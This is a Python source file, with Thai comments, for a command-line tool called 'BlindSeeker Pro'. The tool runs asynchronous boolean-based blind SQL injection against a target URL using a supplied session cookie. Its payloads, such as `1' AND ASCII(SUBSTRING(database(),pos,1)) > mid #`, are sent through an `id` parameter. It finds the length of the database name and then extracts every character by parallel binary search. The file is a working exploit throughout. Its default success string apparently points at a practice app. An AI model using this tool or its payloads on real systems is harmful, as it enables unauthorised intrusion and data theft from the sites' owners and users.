import asyncio
import aiohttp
import argparse
import logging
import time
import sys
from abc import ABC, abstractmethod
from typing import Optional, List, Dict
from urllib.parse import urlparse

# ==========================================
# 🔧 CONFIGURATION & LOGGING
# ==========================================
# ตั้งค่า Logging ให้ดูโปร (มี Timestamp, Level)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger("BlindSeekerPro")

# ==========================================
# 🏗️ DESIGN PATTERN: STRATEGY
# ==========================================
class InjectionStrategy(ABC):
    """
    Abstract Base Class (Blueprint) สำหรับ Strategy การเจาะ
    ทำให้เราสามารถเพิ่ม Logic แบบ Time-based หรือ Error-based ได้ในอนาคต
    โดยไม่ต้องแก้โค้ดหลัก (Open/Closed Principle)
    """
    @abstractmethod
    async def is_truthy(self, session: aiohttp.ClientSession, payload: str) -> bool:
        pass

class BooleanBasedStrategy(InjectionStrategy):
    """
    Implementation สำหรับ Boolean-based SQL Injection
    เช็ค True/False จากข้อความที่ปรากฏบนหน้าเว็บ
    """
    def __init__(self, url: str, success_indicator: str):
        self.url = url
        self.success_indicator = success_indicator

    async def is_truthy(self, session: aiohttp.ClientSession, payload: str) -> bool:
        params = {'id': payload, 'Submit': 'Submit'}
        try:
            async with session.get(self.url, params=params) as response:
                text = await response.text()
                # ถ้าเจอ Success Indicator แสดงว่า Query เป็นจริง
                return self.success_indicator in text
        except Exception as e:
            logger.error(f"Request failed: {e}")
            return False

# ==========================================
# 🧠 CORE ENGINE (ASYNCIO)
# ==========================================
class BlindSQLExploiter:
    def __init__(self, strategy: InjectionStrategy, cookie_str: str, max_concurrency: int = 20):
        self.strategy = strategy
        self.cookies = self._parse_cookies(cookie_str)
        # Semaphore คือตัวคุมโซน ไม่ให้ยิง Request ถล่ม Server จนพัง (Rate Limiting)
        self.semaphore = asyncio.Semaphore(max_concurrency) 
        self.results: Dict[int, str] = {} # เก็บผลลัพธ์ {position: char}

    def _parse_cookies(self, cookie_str: str) -> Dict[str, str]:
        cookies = {}
        if not cookie_str:
            return cookies
        for item in cookie_str.split(';'):
            if '=' in item:
                k, v = item.strip().split('=', 1)
                cookies[k] = v
        return cookies

    async def _binary_search_char(self, session: aiohttp.ClientSession, position: int):
        """
        Logic Binary Search แบบ Asynchronous
        """
        async with self.semaphore: # ขออนุญาตเข้าทำงาน (ถ้าเต็มต้องรอ)
            low, high = 32, 126
            
            while low <= high:
                mid = (low + high) // 2
                if low == high:
                    self.results[position] = chr(low)
                    # print แบบไม่ต้องขึ้นบรรทัดใหม่ เพื่อความสวยงาม
                    sys.stdout.write(f"\r[+] Progress: Found char at pos {position}: {chr(low)}")
                    sys.stdout.flush()
                    return

                # Payload: ASCII(SUBSTRING(database(),pos,1)) > mid
                payload = f"1' AND ASCII(SUBSTRING(database(),{position},1)) > {mid} #"
                
                # เรียกใช้ Strategy ที่เรา Inject เข้ามา (Dependency Injection)
                is_true = await self.strategy.is_truthy(session, payload)

                if is_true:
                    low = mid + 1
                else:
                    high = mid

    async def exploit(self):
        """
        Main Routine เพื่อเริ่มโจมตี
        """
        logger.info("🚀 Engine Started. Initializing Async Session...")
        
        async with aiohttp.ClientSession(cookies=self.cookies) as session:
            # 1. หาความยาวก่อน (แบบง่ายๆ Linear เพื่อความชัวร์)
            logger.info("🔍 Determining database length...")
            length = await self._find_length(session)
            if not length:
                logger.error("❌ Could not determine database length.")
                return

            logger.info(f"✅ Database length found: {length}")
            logger.info("💥 Starting parallel extraction...")

            # 2. สร้าง Tasks สำหรับหาตัวอักษรทุกตัวพร้อมกัน
            start_time = time.time()
            tasks = [self._binary_search_char(session, pos) for pos in range(1, length + 1)]
            
            # 3. รันทุก Tasks พร้อมกัน (Parallel Execution)
            await asyncio.gather(*tasks)
            
            duration = time.time() - start_time
            
            # 4. สรุปผล
            final_name = "".join([self.results[i] for i in sorted(self.results.keys())])
            print(f"\n\n{'-'*40}")
            print(f"🎉 EXTRACTION COMPLETE")
            print(f"{'-'*40}\n")
            print(f"📂 Database Name: {final_name}")
            print(f"⏱️ Time Taken:    {duration:.4f} seconds")
            print(f"⚡ Throughput:     {len(tasks) * 7 / duration:.2f} req/sec (approx)")

    async def _find_length(self, session: aiohttp.ClientSession) -> Optional[int]:
        for i in range(1, 50):
            payload = f"1' AND LENGTH(database()) = {i} #"
            if await self.strategy.is_truthy(session, payload):
                return i
        return None

# ==========================================
# 🎮 ENTRY POINT
# ==========================================
def main():
    parser = argparse.ArgumentParser(description="BlindSeeker Pro - Enterprise Grade SQLi Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-c", "--cookie", required=True, help="Session Cookie")
    parser.add_argument("-s", "--success", default="User ID exists", help="Success indicator string")
    parser.add_argument("-t", "--concurrency", type=int, default=20, help="Max concurrent requests")
    
    args = parser.parse_args()

    # Setup Strategy (Boolean Based)
    # ถ้าอนาคตมี TimeBasedStrategy ก็แค่แก้ตรงนี้บรรทัดเดียว
    strategy = BooleanBasedStrategy(args.url, args.success)
    
    # Initialize Engine
    engine = BlindSQLExploiter(strategy, args.cookie, args.concurrency)
    
    # Run Async Loop
    try:
        asyncio.run(engine.exploit())
    except KeyboardInterrupt:
        logger.warning("\n🛑 Attack interrupted by user.")

if __name__ == "__main__":
    main()